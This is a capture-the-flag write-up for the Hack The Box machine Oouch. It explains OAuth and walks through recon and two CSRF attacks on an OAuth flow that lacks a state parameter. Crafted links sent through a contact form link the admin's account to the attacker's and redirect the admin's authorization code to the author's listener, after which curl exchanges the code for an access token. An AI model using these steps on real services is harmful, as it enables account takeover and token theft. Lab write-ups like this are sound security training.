
##
#
https://darutk.medium.com/diagrams-and-movies-of-all-the-oauth-2-0-flows-194f3c3ade85
#
https://0xdf.gitlab.io/2020/08/01/htb-oouch.html
#
https://snowscan.io/htb-writeup-oouch/#
#
##



The first half of Oouch built all around OAuth,
a technology that is commonplace on the internet today, and yet I didn’t understand well coming into the challenge. 
This box forced me to gain an understanding, and writing this post cemented that even further. To get user, I’ll exploit an insecure implementation of OAuth via a CSRF twice. The first time to get access to qtc’s account on the consumer application, and then to get access to qtc’s data on the authorization server, which includes a private SSH key. With a shell, I’ll drop into the consumer application container and look at how the site was blocking XSS attacks, which includes some messaging over DBus leading to iptables blocks. I’ll pivot to the www-data user via a uWSGI exploit and then use command injection to get execution as root. In Beyond Root, I’ll look at the command injection in the root DBus server code.

Box Info
Name	OouchOouch
Play on HackTheBox
Release Date	29 Feb 2020
Retire Date	01 Aug 2020
OS	Linux Linux
Base Points	Hard [40]
Rated Difficulty	Rated difficulty for Oouch
Radar Graph	Radar chart for Oouch
First Blood User	03:27:54haqpl
First Blood Root	07:52:04sampriti
Creator	qtc
Oauth
Where’s Recon?
For anyone who has read my HTB write-ups before, I always start with Recon, and try to introduce the technology as I come across it. The user portion of Oouch is completely centered on Oauth, an open standard authorization protocol / framework for access delegation, which allows users to grant access to a website to access information on another website without giving the first site the password for the second. Oauth is complicated, and I was finding that trying to introduce it mixed into the enumeration was getting confusing, hence this section up front.

Resources
I did a lot of reading about OAuth to solve Oouch, and then a lot of reading again trying to make this post useful several months later. The most useful resource I found was this medium post, not because it had a ton of detail, but because it had both charts that showed the various flows and the details of the requests that were used at each step. This allowed me to identify different requests and redirects that I was seeing and match them against the flow.

I read a lot of “what is OAuth” posts, but none got really into the depth I needed to solve this box. I did read through the RFC itself. It came be confusing a lot of the times, but has all the detail, and some good ASCII diagrams.

OAuth Basics
General
OAuth defines how three different services interact with each other to share data for the benefit of their users. For example, “Log in with Google” (or some Facebook or GitLab or any other service) is a common case. Some website wants you to create an account, and to have an account, you have to provide an email address, and a phone number. You can sign up and create another account, or you can click “Log in with Google”, and then the small website and Google exchange information and you have an account there. OAuth solves the problem of how do you securely let those two sites talk such that the website knows you are actually authenticated with Google, and only get the information it’s supposed to get.

The three services are the application (or consumer to use the term from Oouch), the authorization server, and the resource server (in the example above Google is both the authorization server and the resource server - this is typical, but it doesn’t have to be this way). Because these two are often the same (both for what we need for Oouch and for many real life examples), I’ll refer to them sometimes just as the OAuth provider.

Set Up
Before a user gets involved, the application needs to register with the OAuth provider. The OAuth provider will have some form to submit, which will include the kind of data that the application wants access to. On registration, the OAuth provider will return to the application a CLIENT_ID and CLIENT_SECRET.

Authorization Flow
The Authorization Flow is the one necessary to understand for Oouch. The user goes to the application (think some website), and clicks the “Log in with Google” link instead of creating an account locally. The application returns a HTTP redirect with a url pointing to the authorization server, with GET parameters that include the CLIENT_ID and a redirect_uri. The redirect_uri is where the applications wants the user sent back to once they are done with the authorization server.

The user now is at the authorization server, where they are asked to log in (if not already), and then presented the option to approve access for the application to data from the resource server. On clicking yes, the authorization server returns a HTTP redirect back to the redirect_uri that was passed to it, but also includes an authorization_code as a GET parameter.

The authorization_code is not enough on it’s own to get access to information from the resource server. It was passed through the user, and could have been compromised there. It is just a short-lived part of the authentication process. The application will send the CLIENT_ID, CLIENT_SECRET, authorization_code, and redirect_url that was originally associated with this request directly to the authorization server (not through the user), and get back an access_token.

The application can set the access_token as the Bearer header in requests to the resource server. Typically once it gets that data it returns a page to the user showing them logged in.

I created this diagram to try to show the process:

OAuth Authorization FlowClick for full size image

You’ll see this again and again throughout this post, with different parts highlighted.

My description and diagram are a simplified version of what’s shown in this image from this post:

Image for post
Recon
nmap
nmap shows four open TCP ports: FTP (21), SSH (22), and HTTP (5000 and 8000):

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.177 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-29 14:12 EST
Nmap scan report for 10.10.10.177
Host is up (0.015s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
5000/tcp open  upnp
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 8.34 seconds

root@kali# nmap -p 21,22,5000,8000 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.177 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-29 14:15 EST
WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for 10.10.10.177
Host is up (0.015s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            49 Feb 11 18:34 project.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.6
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 30000
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
5000/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://10.10.10.177:5000/login?next=%2F
8000/tcp open  rtsp
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   RTSPRequest: 
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   SIPOptions: 
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    <h1>Bad Request (400)</h1>
|_http-title: Site doesn't have a title (text/html).
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=2/29%Time=5E5AB83E%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</
SF:h1>")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Req
SF:uest\x20\(400\)</h1>")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1
SF:>Bad\x20Request\x20\(400\)</h1>")%r(RTSPRequest,64,"RTSP/1\.0\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization
SF:\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>")%r(SIPOptions,63,"SIP/2\.0\
SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Auth
SF:orization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.81 seconds
The OpenSSH version suggests this host is running is Debian 10 buster.

FTP - TCP 21
The version string from nmap, “vsftpd 2.0.8 or later” is weird. I’ve never seen vsftpd print like “or later” before. I did check to see if the v2.3.4 backdoor (like in Lame), but didn’t get anywhere. Seems like more of an easter egg than a path.

nmap also identified that anonymous access was allowed on FTP. On logging in, I see one file, project.txt:

root@kali# ftp 10.10.10.177
Connected to 10.10.10.177.
220 qtc's development server
Name (10.10.10.177:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 11 18:34 .
drwxr-xr-x    2 ftp      ftp          4096 Feb 11 18:34 ..
-rw-r--r--    1 ftp      ftp            49 Feb 11 18:34 project.txt
226 Directory send OK.
ftp> get project.txt
local: project.txt remote: project.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for project.txt (49 bytes).
226 Transfer complete.
49 bytes received in 0.00 secs (54.6251 kB/s)
It’s a small file, which suggests terms for the two webservers.

root@kali# cat project.txt 
Flask -> Consumer
Django -> Authorization Server
Given the name of the box, I’m already thinking OAuth, and this would indicate that one of the webservers is the site I want to access, and the other is the authorization server.

Website - TCP 8000
Visiting port 8000 just returns:

HTTP/1.1 400 Bad Request
Content-Type: text/html
Vary: Authorization
<h1>Bad Request (400)</h1>
I ran gobuster and poked around a bit, but nothing interesting came out. I’ll come back to this later with more information.

Website - TCP 5000
Site
The site goes directly to a login page:

image-20200303210639910
There is a Register link at the top. Once I create a user with username, email, and password, I’m sent back to the login screen, where I can log in:

image-20200303210754302
The Menu link shows the page above. The Profile link shows connected accounts:

image-20200303211632414
The Password Change link provides a form to change my password. I checked the POST request to see if it could be an CSRF like in SecNotes, but there was a csrf_token parameter submitted.

The Documents link says this section is only available for administrative accounts at this time.

The About page says that this is an auth server:

This application is the pilot project for our Oouch authorization server. This server configuration matches the setup that we want to deploy to production soon. It is implemented according to high security standards and offers a simple but secure authorization system across several applications. If you notice bugs inside the application or the authentication flow, please inform our system administrator.

/contact
Finally, the Contact link has a textbox to submit feedback to the system administrator:

Customer contact is really important for us. If you have feedback to our site or found any bugs that influenced your user experience, please do not hesitate to contact us. Messages that were submitted in the message box below are forwarded to the system administrator. Please do not submit security issues using this form. Instead ask our system administrator how to establish an encrypted communication channel.

I can submit a link in there, and it will be clicked on by someone. For example, if I submit:

<a href="http://10.10.14.6/0xdf">click me</a>
I can see a connection attempt in Python http.server or in nc about a minute later:

root@kali# nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.177] 60462
GET /0xdf HTTP/1.1
Host: 10.10.14.6
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
I looked for vulnerabilities in Python Requests, but didn’t find anything.

I also tried some cross site scripting, but anything with <script> or <img> results in this:

image-20200314134738310
Once that message displayed, I was unable to connect to the site for the next minute.

Directory Brute Force
I originally ran gobuster with the small wordlist I typically use:

root@kali# gobuster dir -u http://10.10.10.177:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o scans/gobuster-5000-root-small -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.177:5000
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/02/29 14:33:59 Starting gobuster
===============================================================
/about (Status: 302)
/contact (Status: 302)
/home (Status: 302)
/login (Status: 200)
/register (Status: 200)
/profile (Status: 302)
/documents (Status: 302)
/logout (Status: 302)
===============================================================
2020/02/29 14:40:05 Finished
===============================================================
On not finding much else, I came back with big:

root@kali# gobuster dir -u http://10.10.10.177:5000 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o scans/gobuster-5000-root-big -t 10
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.177:5000
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/03 17:39:11 Starting gobuster
===============================================================
/about (Status: 302)
/contact (Status: 302)
/documents (Status: 302)
/home (Status: 302)
/login (Status: 200)
/logout (Status: 302)
/oauth (Status: 302)
/profile (Status: 302)
/register (Status: 200)
===============================================================
2020/03/03 17:42:56 Finished
===============================================================
One new one appeared: /oauth (which makes perfect sense with the focus of the box).

/oauth
This page gives instructions for how to connect to the oauth server:

image-20200303213551892
Note: Visiting /oauth/ doesn’t work. The trailing / breaks it.

This must be the account connecting mentioned on the profile page.

I’ll add consumer.oouch.htb and ouch.htb to my /etc/hosts file. I did some fuzzing for other vhosts on :5000, but didn’t find any. I also did a gobuster on the /oauth path, and found the two paths linked to from /oauth, connect and login, but nothing else.

authorization.oouch.htb:8000
Enumeration of :8000/oauth
Visiting http://consumer.oouch.htb:5000/oauth/connect returns a 302 redirect to a new vhost on port 8000:

http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read
On my OAuth diagram:

OAuth Authorization FlowClick for full size image

After adding the authorization.oouch.htb subdomain to /etc/hosts, that redirect lands me at a login page:

image-20200729173947737
My account from port 5000 doesn’t work.

Web Root
Just visiting http://authorization.oouch.htb:8000 gives a welcome page for the authorization server:

image-20200729174104015
The two links point to http://authorization.oouch.htb:8000/login/ and http://authorization.oouch.htb:8000/signup/.

Directory Brute Force
Running gobuster now with the updated subdomain returns three paths:

root@kali# gobuster dir -u http://authorization.oouch.htb:8000 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o scans/gobuster-8000-authorization.out.htb-big -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://authorization.oouch.htb:8000
[+] Threads:        40
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/04 17:22:49 Starting gobuster
===============================================================
/home (Status: 301)
/login (Status: 301)
/signup (Status: 301)
===============================================================
2020/03/04 17:24:11 Finished
===============================================================
/login and /signup I knew from the welcome page. /home returns the same thing as / when not logged in.

/signup
There is another signup page, for a different account with different requirements:

image-20200308163104756Click for full image
This makes sense. In a real world scenario, these would be completely different services, hosted by different organization, on different servers. That’s represented by the two ports here in HTB.

I played with the SSH fields, seeing if Oouch would connect back to me on 22, but I didn’t have any luck for now.

/home
I was able to create an account and then login. I’m redirected to /home:

image-20200308163317746
Clicking on the link to /oauth/authorize returns an error:

image-20200308163436662
I will poke at that more later.

/oauth/token returns what looks like a blank page in the browser, but looking in Burp I see it’s a 405 Method Not Allowed response with no body:

HTTP/1.1 405 Method Not Allowed
Content-Type: text/html; charset=utf-8
Allow: POST, OPTIONS
X-Frame-Options: SAMEORIGIN
Content-Length: 0
Vary: Authorization
If I send that request to Repeater and change it to a post, I get a different error:

HTTP/1.1 400 Bad Request
Content-Type: application/json
Cache-Control: no-store
Pragma: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 35
Vary: Authorization

{"error": "unsupported_grant_type"}
I could fuzz this, but given my understanding of OAuth from the introduction, I’m going to come back to this once I have the required inputs, CLIENT_ID, CLIENT_SECRET, redirect_uri, and authorization_code.

More Directory Brute Force
Before starting to work on Oauth, I also started another gobuster in the background to look for endpoints:

root@kali# gobuster dir -u http://authorization.oouch.htb:8000/oauth -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 20 -o scans/gobuster-8000-oauth-big
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://authorization.oouch.htb:8000/oauth
[+] Threads:        20
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/09 17:46:45 Starting gobuster
===============================================================
/applications (Status: 301)
/authorize (Status: 301)
/token (Status: 301)
===============================================================
2020/03/09 17:48:19 Finished
===============================================================
It found the two endpoints I already knew about, but also this third endpoint, /oauth/applications, which I’ll need later. Visiting now just pops HTTP basic auth, and I don’t have valid creds.

Oauth
Connect Accounts
I started to explore how to the oath account connection process works. I started logged into both accounts in my browser. Then I visited the link from the consumer oauth page, http://consumer.oouch.htb:5000/oauth/connect. This is like saying “Login with Google” in a public example. Like above, I’m redirected to a page on authorization.oouch.htb:8000, but since I’m logged in, I get a page with a question:

image-20200308171935111
When I click authorize, I’m redirected back to my profile page on port 5000, and now there’s a connected account:

image-20200308172018997
Requests
Looking in Burp, I can see a series of five requests that lead back to /profile:

image-20200308202649128
Those five requests line up with the four requests in my diagram (plug the request to /profile which would come next in my diagram):

OAuth Authorization FlowClick for full size image

The first is a GET to /oauth/connect, with the cookie for the :5000 site session. It returns a 302 redirect to http://authorization.oouch.htb:8000/oauth/authorize/ with four parameters:

client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82
response_type=code
redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token
scope=read
Following this redirect returns that page with the button for me to click Authorize. Clicking that button sends a POST to the same url, with the same parameters in the url, and the same parameters in the POST body, with three additional:

csrfmiddlewaretoken=8LoJjvYe7uX6aivOdY7S9DaJgcIFT57CORNJ7x8J63SfG0sZ6zn6UFqj6gi5wdQO
state=
allow=Authorize
That returns a 302 redirect to http://consumer.oouch.htb:5000/oauth/connect/token with the GET parameters code=72blODjikMf0PbTJ27abbY34XnCjAs.

The request responds with another 302 redirect, this time to /profile.

Shell as qtc on oouch
qtc on consumer
Vulnerability
I’m going to look at the process where the client is going back to the application with the authorization code.

img
When the application receives this request, it will reach out to the authorization server and get information about the account that controls login for the application. If I can get someone else to submit this request, then their account will be linked to the account I control on the authorization server.

From the previous reference, I can see the Request from the application (consumer) to authorization server looks like this:

GET {Authorization Endpoint}
  ?response_type=code             // - Required
  &client_id={Client ID}          // - Required
  &redirect_uri={Redirect URI}    // - Conditionally required
  &scope={Scopes}                 // - Optional
  &state={Arbitrary String}       // - Recommended
  &code_challenge={Challenge}     // - Optional
  &code_challenge_method={Method} // - Optional
  HTTP/1.1
HOST: {Authorization Server}
There’s a recommend (and therefore optional) parameter state designed to prevent this kind of Cross Site Request Forgery (CSRF) attack. This value isn’t shown to the client, but stored on consumer, associated with my account via cookie. Later, when the authorization is done, and a 302 to the redirect_uri is sent back, it’s sent back with the code and the state if in use. If that state value doesn’t match for the account loading the page, there’s a CSRF failure, and the process fails. Because the 302 from the authorization server with the authorization_code doesn’t include state, it must not be in use here, and this attack can work.

In Practice
First I’ll create accounts for both servers (0xdf-consumer and 0xdf-auth), and log into both, and link the accounts.

image-20200309173125506
Now I’ll start the account linking process again, but this time, I will have Burp Proxy intercepting each request. I’ll forward the first three requests, stopping when it’s trying to load consumer.oouch.htb:5000/oauth/connect/token:

GET /oauth/connect/token?code=76tcpZBboMvWODlVU0LNkRDMVCQB7m HTTP/1.1
Host: consumer.oouch.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read
Connection: close
Cookie: session=.eJy1kM9OwzAMxl8ly3mg_G2aPQWCAwc0TY5jrxVdi5pUQpr27kSICwdOwMmy7N_n7_NVnniCMlCRh5erFLUVeaFS4ExyLx8mgkJiWs5inEVdBCC2oajDWMRb27mXx9v-77hHOo-lrlDHZRZP2yfE27QTzzThciGh3jPvfsHe4TKX7ULrDyL_avzb8eO-vX6lMshDXTdq3ZjlQZpoTWfARw_ck4smhaRZaRMwg0NryaPPoECDcsnnjEphz7lTDEZhJqaEnQMMGjoOTkPoooEUvY7EuSn0aD0k5a3jztiI1oSkjGKTk_WqZcGy8qkurzQ3P8FCAq1DMl3wzkGOifvggGyATNBDbC5cto3bCq1fIeTtA92OwOo.XmawFg.5VWJ9iBk8looCFxsuQTc5oCDMJ8
Upgrade-Insecure-Requests: 1
I’ll craft that into a link, and drop the request so it’s not sent to the server:

<a href="http://consumer.oouch.htb:5000/oauth/connect/token?code=QY4G64bZGMj05zy5Krq49HmMDHIP8w">click me</a>
I’ll submit the link to the contact form. After a minute or two, I’ll see 0xdf-auth is no longer connected in the Profile page for 0xdf-consumer:

image-20200309173807145
I’ll log out, and then go to /oauth/login, and click yes when prompted to login using OAuth. But my account on the authorization server now is linked to whoever clicked the link. Visiting the Profile page, I see I’m logged in as qtc:

image-20200309173903551
qtc on authorization
Enumeration
Now with access to as qtc on the consumer site, I can see documents stored for the admin account:

image-20200309174022442
The three documents each give a hint:

I have credentials for application registration.
I need to find /api/get_user API and use it to get user data
The /oauth/authorize method, which I saw in the Oauth flow above as a POST, now supports GET, which makes sending it as a link to the contact form a possibility.
I’ll eventually find SSH keys for qtc which I’ll use to get a shell.
Remembering the /oauth/applications path from above, I started to poke around there. It asks for HTTP auth, but it doesn’t work. Eventually I tried /oauth/applications/register, and the creds for HTTP basic auth do work there.

image-20200311061131193
Now I can register an application with the authorization server. Why does this matter? If I can trick something to authorizing my application to connect with the authorization server, I can request the info from the authorization server about that user (which it sounds like included SSH keys).

I was able to register an application with a redirect_uri of my box (/token is arbitrary, but once I set it here, it has to match in subsequent applications):

image-20200311065052285
It gives me the CLIENT_ID and CLIENT_SECRET for the app.

:8000/oauth/authorize
With the idea that there are different applications (and now I can create them) in mind, I wanted to look at the OAuth flows associated with :8000/oauth/authorize again. Earlier when I hit this endpoint directly, it returned a missing client_id error. When looking at the Oauth flows in Burp when I was linking my profile, I see two requests in a row to this API. First a GET, then a POST. These represent the two marked requests in the diagram:

imgClick for full size image

These requests both include client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82. This is the ID that the application on port 5000 received when it registered with the authorization server on port 8000.

I’ll grab the POST request to :8000/oauth/authorize in Burp Proxy and kick it over to repeater:

POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&scope=read HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&scope=read
Content-Type: application/x-www-form-urlencoded
Content-Length: 264
Connection: close
Cookie: csrftoken=OGnVcXdWziRrIcISRJovzoNterqmLZeifBvxetEu1Inl5LeMP8zTuuHL05bAzVlL; sessionid=1rzmsqcaprtztfba3xxywdrtk1u5vz3j
Upgrade-Insecure-Requests: 1

csrfmiddlewaretoken=jqwRWtcqi4BTXPHM88lUdUvmFqyCzbWNKicTe2AzGMxTcla1PACQiKx23Wmb0hVR&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Flogin%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize
If I send this, I get back a 302 redirect to the redirect_uri with the code attached:

HTTP/1.1 302 Found
Content-Type: text/html; charset=utf-8
Location: http://consumer.oouch.htb:5000/oauth/login/token?code=9E3iRBIZpLtvrwuC0NeNuvWckA3yI8
X-Frame-Options: SAMEORIGIN
Content-Length: 0
Vary: Authorization, Cookie
The notes above suggest that this endpoint now supports GET. To convert this to a GET, I started by changing POST to GET, but that just leads to the page with the button to click Authorize, just like in the Oauth flow originally. I started playing with various POST parameters from the request above, adding them as GET parameters. Once I add &allow=Authorize to the GET parameters, I get the redirect I’m looking for. I’ll clean up the request a bit more and get:

GET /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&scope=read&allow=Authorize&state= HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&scope=read
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Connection: close
Cookie: sessionid=nr57zmuau38o2j89sgbecvg83jyu4px6
Upgrade-Insecure-Requests: 1
I was able to take out both the CSRF parameter in the POST and the CSRF cookie. I could also take out the sessionid cookie, but then I get the login page instead of the redirect_uri.

Now I want to change the redirect_url to something else, but it returns a 400 Bad request:

            <h2>Error: invalid_request</h2>
            <p>Mismatching redirect URI.</p>
If I update the client_id and the redirect_uri to match what I registered above, the request will come back without throwing that error:

GET /oauth/authorize/?client_id=d3VwRo9trmopGfGpiYUsKhkwE674SgAM3wT5A6EQ&response_type=code&redirect_uri=http://10.10.14.6/token&scope=read&allow=Authorize&state= HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/login/token&scope=read
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Connection: close
Cookie: sessionid=nr57zmuau38o2j89sgbecvg83jyu4px6
Upgrade-Insecure-Requests: 1
HTTP/1.1 302 Found
Content-Type: text/html; charset=utf-8
Location: http://10.10.14.6/token?code=eG2kDsLExEKn8tVtzqERCXwyx7b95U
X-Frame-Options: SAMEORIGIN
Content-Length: 0
Vary: Authorization, Cookie
CSRF #2
With the GET request above, I can now send this as a link to the admin and have them click on it and redirect to me. I’ll create the following link:

<a href="http://authorization.oouch.htb:8000/oauth/authorize/?client_id=d3VwRo9trmopGfGpiYUsKhkwE674SgAM3wT5A6EQ&response_type=code&redirect_uri=http://10.10.14.6/token&scope=read&state=&allow=Authorize">click me</a>
About a minute after sending this through the contact form, someone clicks on it from Oouch, and this request comes back:

root@kali# nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.177] 45972
GET /token?code=9a5Q0yBlx7ONDslRKGlulr6a7i8vOM HTTP/1.1
Host: 10.10.14.6
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: sessionid=0wlwoshe5nbpgmgw7357g0a9fgq4xowx;
What just happened? I sent a link that when clicked on started the person who clicked in the process of telling the authentication server that they wanted my application to get access to their data on the authorization server, with the request marked in red below. What comes back to my nc listener is the client’s browser being redirected to my application with the request marked in green:

imgClick for full size image

I did notice that a PHP session cookie was included in that request. This makes no sense to me, but I’ll look at it in Beyond Root.

Request Access Token
When the client sends me the authorization_code, I can use that to request an access_token.

I’ll use curl to send the request with the client_id, client_secret, and grant_type from my application (the secret and id are different from the image above because I had to re-register to update this post), the redirect_uri , and the code (pipped into jq to make the result more readable):

root@kali# curl http://authorization.oouch.htb:8000/oauth/token/ -d 'client_id=HTGoodnXs4IMOYhJzfss3JmF7m64bQHkoPwZOghy&client_secret=5MUCcGC9TlHJOWqmT2qJjqxKHHIzdGKE8PKqoIOgfhecIUPjoSTnxhWdNWI4BgqLb2yMcnq1N5viFgArgkd6PSWWxfJLPsxYP0kAgAS6AmoF9gNFVO56jymUpcnBYunm&redirect_uri=http://10.10.14.6/token&code=Yv0c6OXDFGhpMJ2nqvDTbMVcOfo3Si&grant_type=authorization_code' | jq .
{
  "access_token": "gm05wp2kDWhSmS3QrZmdEqgvFGoEKD",
  "expires_in": 600,
  "token_type": "Bearer",
  "scope": "read",
  "refresh_token": "lGaAVRyhTybjuiRrF8SVPgiSNXR9Bk"
}
It is worth noting the expires_in value of ten minutes. I lost some time enumerating the API when the token expired and I didn’t realize it. I can use the refresh_token to request a new access_token (I’ll leave that as an exercise for the reader).

SSH as qtc
get_user
I still have the hint about /api/get_user, and it makes sense now that I have an access_token to access qtc’s data. I was able to find the API pretty easily at authorization.oouch.htb:8000/api/get_user. In a browser, it just returns a blank page. In Burp, I see it’s a 403:

HTTP/1.1 403 Forbidden
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 0
Vary: Authorization
I can add the Authorization: Bearer [token] header, and it works:

